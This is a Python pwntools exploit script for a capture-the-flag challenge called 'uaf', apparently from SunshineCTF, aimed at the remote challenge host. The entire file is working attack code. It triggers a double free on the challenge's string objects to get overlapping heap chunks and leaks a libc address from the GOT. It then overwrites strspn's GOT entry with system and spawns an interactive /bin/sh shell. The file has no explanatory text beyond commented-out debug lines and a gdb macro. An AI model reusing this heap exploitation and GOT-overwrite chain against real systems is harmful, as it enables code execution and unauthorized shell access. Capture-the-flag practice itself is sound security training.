from pwn import *
import time
import sys
import ctypes

def uaf(DEBUG):
	if DEBUG=="1":
		r = process("./uaf")
		raw_input("debug?")
	elif DEBUG=="2":
		r = process("./uaf", env={"LD_PRELOAD":"./libc.so.6"})
		raw_input("debug?")
	elif DEBUG=="3":
		HOST = 'chal1.sunshinectf.org'
		PORT = 20001
		r = remote(HOST,PORT)
	
	def create_array(array):
		r.sendline("1")
		r.recvuntil("How many integers?")
		r.sendline(str(len(array)))
		r.recvuntil(" integers:")
		r.sendline(" ".join(map(str,array)))
		r.recvuntil("ID of integer array: ")
		res = r.recvuntil("\n")[:-1]
		r.recvuntil("(>) ")
		return res
		
	def create_string(s):
		r.sendline("2")
		r.recvuntil("Enter a text string:")
		r.sendline(s)
		r.recvuntil("ID of text string: ")
		res = r.recvuntil("\n")[:-1]
		r.recvuntil("(>) ")
		return res
	
	def edit_array(addr, idx, new_value):
		r.sendline("3")
		r.recvuntil("Enter object ID:")
		r.sendline(str(addr))
		r.recvuntil("Enter index to change:")
		r.sendline(str(idx))
		r.recvuntil("Enter new value:")
		r.sendline(str(new_value))
		r.recvuntil("(>) ")
	
	def show_array(addr):
		r.sendline("4")
		r.recvuntil("Enter object ID:")
		r.sendline(str(addr))
		r.recvuntil("Integer array:\n")
		res = r.recvuntil("\n")[:-1]
		r.recvuntil("(>) ")
		return res
		
	def show_string(addr):
		r.sendline("5")
		r.recvuntil("Enter object ID:")
		r.sendline(str(addr))
		r.recvuntil("Text string:\n")
		res = r.recvuntil("\n")[:-1]
		r.recvuntil("(>) ")
		return res
	
	def delete_array(addr):
		r.sendline("6")
		r.recvuntil("Enter object ID:")
		r.sendline(str(addr))
		r.recvuntil("(>) ")
	
	def delete_string(addr):
		r.sendline("7")
		r.recvuntil("Enter object ID:")
		r.sendline(str(addr))
		r.recvuntil("(>) ")
	
	size = 0x4
	strtol_got = 0x804A820
	strspn_got = 0x804a824
	strdup_got = 0x804A7F4
	free_got = 0x804a7f0
	arr1 = create_array([1]*0x11)
	arr1 = int(arr1)
	# print hex(arr1)
	arr2 = create_array([1]*0x11)
	arr2 = int(arr2)
	# print hex(arr2)
	
	str0 = create_string("/bin/sh")
	# print str0
	str1 = create_string("A"*size)
	# print hex(int(str1))
	str2 = create_string("B"*size)
	str3 = create_string("C"*size)
	delete_string(str2)
	delete_string(str1)
	delete_string(str2)
	
	payload = p32(arr1-4)
	create_string(payload)
	create_string("E"*size)
	create_string("F"*size)
	payload = p32(strspn_got)
	
	create_string(payload)
	
	res = show_array(str(arr1))
	# print res
	list_addr = res[1:-1].split(", ")
	# strtol =((0x800000000+(int(list_addr[0])>>8))&0xffffff)+0x7f000000
	# strtol = 0x800000000+int(list_addr[0])
	strspn = 0x800000000+int(list_addr[0])
	
	# print hex(strtol)
	# base_libc = strdup - 0x752a0 # libc-2.23.so
	# base_libc = free - 0x71470 # libc-2.23.so
	base_libc = strspn - 0x13df00 # libc-2.23.so
	# strspn = base_libc + 0x13df00
	calloc = base_libc + 0x71810
	system = base_libc + 0x3ada0
	log.info('base_libc: %#x' % base_libc)
	log.info('system: %#x' % system)
	# log.info('strtol: %#x' % strtol)
	log.info('strspn: %#x' % strspn)
	log.info('calloc: %#x' % calloc)
	delete_string(str1)
	delete_string(str2)
	delete_string(str1)
	payload = p32(arr2-4)
	create_string(payload)
	create_string("E"*size)
	create_string("F"*size)
	payload = p32(strspn_got+2)
	create_string(payload)
	raw_input("?")
	value = system&0xffff
	edit_array(arr1, 0, str(value))
	value = ((calloc & 0xffff)*0x10000)+((system >> 2**4)&0xffff)
	# value = ((system >> 2**4)&0xffff)
	# print hex(calloc & 0xffff)
	print hex(value)
	edit_array(arr2, 0, str(value))
	
	delete_string(str1)
	delete_string(str2)
	delete_string(str1)
	# raw_input("?")
	r.sendline("1")
	r.sendline("17")
	r.sendline("/bin/sh")
	
	r.interactive()

uaf(sys.argv[1])
"""
define ff
telescope $ebp-0x1ac 2
telescope $ebp-0x174 40
fastbins 
end
"""